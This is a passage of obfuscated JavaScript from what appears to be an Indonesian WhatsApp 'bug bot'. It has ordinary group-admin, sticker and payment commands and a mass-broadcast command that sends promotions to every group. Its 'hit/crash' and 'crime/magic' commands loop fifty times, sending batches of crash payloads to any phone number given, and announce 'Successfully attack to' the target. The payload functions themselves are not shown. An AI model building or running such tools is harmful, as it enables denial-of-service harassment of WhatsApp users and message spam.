‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x4b6ef9 of _0x197555) {
            _0x319487 += "⊝ @" + _0x4b6ef9.id.split("@")[0] + "\n";
          }
          HadzzModa.sendMessage(_0x3ac71a.chat, {
            text: _0x319487,
            mentions: _0x197555.map(_0x5900cb => _0x5900cb.id)
          }, {
            quoted: _0x3ac71a
          });
        }
        break;
      case "kick":
      case "addprem":
        {
          if (!_0x339e8f) {
            return _0x2bc992(mess.only.owner);
          }
          if (!_0x490112[0]) {
            return _0x2bc992("Penggunaan " + (_0x2064f9 + _0xf77d4c) + " nomor\nContoh " + (_0x2064f9 + _0xf77d4c) + " 62×××");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0xc65613 = await _0x463682.onWhatsApp(prrkek);
          if (_0xc65613.length == 0) {
            return _0x2bc992("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x7af6e6.push(prrkek);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(_0x7af6e6));
          _0x2bc992("`[ 🇮🇩 ]` 𝗛𝗮𝗶 𝗞𝗮𝗸 " + prrkek + " 𝗞𝗮𝗺𝘂 𝗦𝘂𝗱𝗮𝗵 𝗣𝗿𝗲𝗺𝗶𝘂𝗺");
        }
        break;
      case "delprem":
        {
          if (!_0x339e8f) {
            return _0x2bc992(mess.only.owner);
          }
          if (!_0x490112[0]) {
            return _0x2bc992("Penggunaan " + (_0x2064f9 + _0xf77d4c) + " nomor\nContoh " + (_0x2064f9 + _0xf77d4c) + " 62×××");
          }
          ya = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x7af6e6.indexOf(ya);
          _0x7af6e6.splice(unp, 1);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(_0x7af6e6));
          _0x2bc992("`[ 🇮🇩 ]` 𝗛𝗮𝗶 𝗞𝗮𝗸 " + ya + " 𝗞𝗮𝗺𝘂 𝗕𝘂𝗸𝗮𝗻 𝗟𝗮𝗴𝗶 𝗣𝗿𝗲𝗺𝗶𝘂𝗺");
        }
        break;
        case "addowner":
        if (!_0x339e8f) {
          return _0x2bc992(mess.only.owner);
        }
        if (!_0x490112[0]) {
          return _0x2bc992("Penggunaan " + (_0x2064f9 + _0xf77d4c) + " nomor\nContoh " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let _0x14c590 = await _0x463682.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x14c590.length == 0) {
          return _0x2bc992("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        _0x52b6a2.push(bnnd);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(_0x52b6a2));
        _0x2bc992("`[ 🇮🇩 ]` 𝗛𝗮𝗶 𝗞𝗮𝗸 " + bnnd + " 𝗞𝗮𝗺𝘂 𝗦𝘂𝗱𝗮𝗵 𝗠𝗲𝗻𝗷𝗮𝗱𝗶 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗕𝘂𝗴");
        break;
      case "delowner":
        if (!_0x339e8f) {
          return _0x2bc992(mess.only.owner);
        }
        if (!_0x490112[0]) {
          return _0x2bc992("Penggunaan " + (_0x2064f9 + _0xf77d4c) + " nomor\nContoh " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = _0x52b6a2.indexOf(ya);
        _0x52b6a2.splice(unp, 1);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(_0x52b6a2));
        _0x2bc992("`[ 🇮🇩 ]` 𝗛𝗮𝗶 𝗞𝗮𝗸 " + ya + " 𝗞𝗮𝗺𝘂 𝗕𝘂𝗸𝗮𝗻 𝗟𝗮𝗴𝗶 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗦𝗮𝘆𝗮");
        break;
        {
          if (!_0x3d7b7a) {
            return _0x2bc992("Only Group");
          }
          if (!_0x337639 && !_0x339e8f) {
            return _0x2bc992("Only Admin");
          }
          if (!_0x223faa) {
            return _0x2bc992("Bot Bukan Admin :(");
          }
          let _0x3158fd = _0x3ac71a.quoted ? _0x3ac71a.quoted.sender : _0x2d7ff5.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x463682.groupParticipantsUpdate(_0x3ac71a.chat, [_0x3158fd], "remove").then(_0x1a276c => _0x2bc992(util.format(_0x1a276c))).catch(_0x53dac8 => _0x2bc992(util.format(_0x53dac8)));
        }
        break;
      case "close":
        {
          if (!_0x3d7b7a) {
            return _0x2bc992("Khusus Group Bego");
          }
          if (!_0x337639 && !_0x339e8f) {
            return _0x2bc992("Khusus Admin");
          }
          if (!_0x223faa) {
            return _0x2bc992("Bot Bukan Admin Bego");
          }
          if (!_0x490112[0]) {
            return _0x2bc992("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x2064f9 + _0xf77d4c) + "10 second");
          }
          if (_0x490112[1] == "second") {
            var _0x239c7d = _0x490112[0] * "1000";
          } else if (_0x490112[1] == "minute") {
            var _0x239c7d = _0x490112[0] * "60000";
          } else if (_0x490112[1] == "hour") {
            var _0x239c7d = _0x490112[0] * "3600000";
          } else if (_0x490112[1] == "day") {
            var _0x239c7d = _0x490112[0] * "86400000";
          }
          _0x2bc992("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            var _0x1d33ba = _0x3ac71a.participant;
            _0x463682.groupSettingUpdate(_0x3ac71a.chat, "announcement");
            _0x2bc992("Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin");
          }, _0x239c7d);
        }
        break;
      case "open":
        {
          if (!_0x3d7b7a) {
            return _0x2bc992("Khusus Group Bego");
          }
          if (!_0x337639 && !_0x339e8f) {
            return _0x2bc992("Khusus Admin");
          }
          if (!_0x223faa) {
            return _0x2bc992("Bot Bukan Admin Bego");
          }
          if (!_0x490112[0]) {
            return _0x2bc992("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x2064f9 + _0xf77d4c) + "10 second");
          }
          if (_0x490112[1] == "second") {
            var _0x239c7d = _0x490112[0] * "1000";
          } else if (_0x490112[1] == "minute") {
            var _0x239c7d = _0x490112[0] * "60000";
          } else if (_0x490112[1] == "hour") {
            var _0x239c7d = _0x490112[0] * "3600000";
          } else if (_0x490112[1] == "day") {
            var _0x239c7d = _0x490112[0] * "86400000";
          }
          _0x2bc992("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            var _0x24c098 = _0x3ac71a.participant;
            _0x463682.groupSettingUpdate(_0x3ac71a.chat, "not_announcement");
            _0x2bc992("Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan");
          }, _0x239c7d);
        }
        break;
      case "demote":
        {
          if (!_0x1a75ef) {
            return _0x2bc992(mess.only.premium);
          }
          if (!_0x3d7b7a) {
            return _0x2bc992("Only Group");
          }
          if (!_0x337639 && !_0x339e8f) {
            return _0x2bc992("Only Admin");
          }
          if (!_0x223faa) {
            return _0x2bc992("Bot Bukan Admin :(");
          }
          let _0x53ace3 = _0x3ac71a.mentionedJid[0] ? _0x3ac71a.mentionedJid[0] : _0x3ac71a.quoted ? _0x3ac71a.quoted.sender : _0x2d7ff5.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x463682.groupParticipantsUpdate(_0x3ac71a.chat, [_0x53ace3], "demote").then(_0x41ce94 => _0x2bc992(util.format(_0x41ce94))).catch(_0x11db82 => _0x2bc992(util.format(_0x11db82)));
        }
        break;
      case "promote":
        {
          if (!_0x3d7b7a) {
            return _0x2bc992("Only Group");
          }
          if (!_0x337639 && !_0x339e8f) {
            return _0x2bc992("Only Admin");
          }
          if (!_0x223faa) {
            return _0x2bc992("Bot Bukan Admin :(");
          }
          let _0x5345bb = _0x3ac71a.quoted ? _0x3ac71a.quoted.sender : _0x2d7ff5.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x463682.groupParticipantsUpdate(_0x3ac71a.chat, [_0x5345bb], "add").then(_0x115949 => _0x2bc992(util.format(_0x115949))).catch(_0x2584ce => _0x2bc992(util.format(_0x2584ce)));
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!_0x339e8f) {
            return _0x2bc992(mess.only.owner);
          }
          if (!_0x2d7ff5 && !_0x3ac71a.quoted) {
            return _0x3ac71a.reply("teksnya atau replyteks");
          }
          var _0x1eba3c = _0x3ac71a.quoted ? _0x3ac71a.quoted.text : _0x2d7ff5;
          let _0x41f609 = 0;
          let _0x247557 = await _0x463682.groupFetchAllParticipating();
          let _0x2b9f62 = Object.entries(_0x247557).slice(0).map(_0x11b0c9 => _0x11b0c9[1]);
          let _0x2fe7b9 = _0x2b9f62.filter(_0x15d8a7 => _0x15d8a7.announce == false);
          let _0x4821b8 = _0x2fe7b9.map(_0x144a2c => _0x144a2c.id);
          _0x3ac71a.reply("Memproses Mengirim Pesan Ke *" + _0x4821b8.length + " Grup*");
          let _0x4ee011 = _0x1eba3c;
          const _0x5b3b2e = {
            text: _0x4ee011
          };
          let _0x24d27f = generateWAMessageFromContent(_0x3ac71a.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x3ac71a.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x5b3b2e),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6289517977390\",\"merchant_url\":\"https://https://whatsapp.com/channel/0029VatY2JHHltYEy0yenJ47\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + isLink + "\",\"merchant_url\":\"https://https://whatsapp.com/channel/0029VatY2JHHltYEy0yenJ47\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://pomf2.lain.la/f/wrk6cuul.jpg\",\"merchant_url\":\"https://pomf2.lain.la/f/wrk6cuul.jpg\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x3ac71a.sender,
            quoted: _0x3ac71a
          });
          for (let _0x2699a4 of _0x4821b8) {
            try {
              await _0x463682.relayMessage(_0x2699a4, _0x24d27f.message, {
                messageId: _0x24d27f.key.id
              });
              _0x41f609 += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0x3ac71a.reply("Berhasil Mengirim Pesan Ke *" + _0x41f609 + " Grup*");
        }
        break;
      case "payment":
        {
          let _0x55296a = _0x21ea85("PAYMENT") + "\n\n*(E-WALLET)*\n\n   *DANA*\n- " + dana + "\n\nHarap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You\n\n© " + storename;
          const _0x21741a = {
            showAdAttribution: true,
            renderLargerThumbnail: false,
            title: "QRIS? KLIK DISINI",
            body: "Date : " + _0x340129 + ", " + _0x5b0771,
            containsAutoReply: true,
            mediaType: 1,
            thumbnailUrl: "https://pomf2.lain.la/f/wrk6cuul.jpg",
            sourceUrl: "" + qris
          };
          const _0x142c36 = {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [_0x3ac71a.sender],
            externalAdReply: _0x21741a
          };
          const _0x3431e4 = {
            text: _0x55296a,
            contextInfo: _0x142c36
          };
          const _0x3bd800 = {
            quoted: _0x55c10d
          };
          _0x463682.sendMessage(_0x17a7f6, _0x3431e4, _0x3bd800);
          await sleep(1500);
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(_0x35d65a)) {
            return _0x2bc992("Reply Sticker!!");
          }
          _0x2bc992(mess.wait);
          let _0xed2a2c = await _0x463682.downloadAndSaveMediaMessage(qmsg);
          let _0x5a5840 = await getRandom(".png");
          exec("ffmpeg -i " + _0xed2a2c + " " + _0x5a5840, _0x2e3eb1 => {
            fs.unlinkSync(_0xed2a2c);
            if (_0x2e3eb1) {
              return _0x2e3eb1;
            }
            let _0x4c1c5a = fs.readFileSync(_0x5a5840);
            const _0x41b326 = {
              image: _0x4c1c5a
            };
            VxoZap.sendMessage(_0x3ac71a.chat, _0x41b326, {
              quoted: _0x3ac71a
            });
            fs.unlinkSync(_0x5a5840);
          });
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
          if (!_0x339e8f) {
            return _0x2bc992(mess.only.owner);
          }
          if (!_0x467f6d) {
            return _0x2bc992("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x2064f9 + _0xf77d4c) + "\nDurasi Video 1-9 Detik");
          }
          if (/image/.test(_0x35d65a)) {
            let _0x56db15 = await _0x467f6d.download();
            const _0x4f332a = {
              packname: global.packname,
              author: global.author
            };
            let _0x3392c5 = await _0x463682.sendStimg(_0x17a7f6, _0x56db15, _0x3ac71a, _0x4f332a);
            await fs.unlinkSync(_0x3392c5);
          } else if (/video/.test(_0x35d65a)) {
            if ((_0x467f6d.msg || _0x467f6d).seconds > 11) {
              return _0x2bc992("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
            }
            let _0x6b39bb = await _0x467f6d.download();
            const _0x464a04 = {
              packname: global.packname,
              author: global.author
            };
            let _0x515395 = await _0x463682.sendStvid(_0x17a7f6, _0x6b39bb, _0x3ac71a, _0x464a04);
            await fs.unlinkSync(_0x515395);
          } else {
            _0x2bc992("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x2064f9 + _0xf77d4c) + "\nDurasi Video 1-9 Detik");
          }
        }
        break;
      case "hit":
      case "crash":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      case "crime":
      case "magic":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
